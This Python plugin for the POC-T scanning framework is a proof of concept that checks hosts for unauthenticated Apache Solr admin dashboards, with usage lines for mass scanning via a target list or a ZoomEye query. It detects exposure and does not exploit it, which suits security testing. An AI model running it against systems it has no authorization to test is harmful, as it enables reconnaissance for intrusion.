#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache Solr 未授权访问PoC
  (iterate_path函数使用场景示例)

Usage
  python POC-T.py -s solr-unauth -iF target.txt
  python POC-T.py -s solr-unauth -aZ "solr country:cn"

"""
from lib.verify import verify
from lib.random_header import get_ua
import requests

vuln = ['solr']


def check(ip, ports, apps):
    if verify(vuln, ports, apps):
        try:
            url = 'http://' + ip
            url = url + '/solr/'
            g = requests.get(url, headers=get_ua(), timeout=5)
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return 'Apache Solr Admin leask'
        except Exception:
            pass
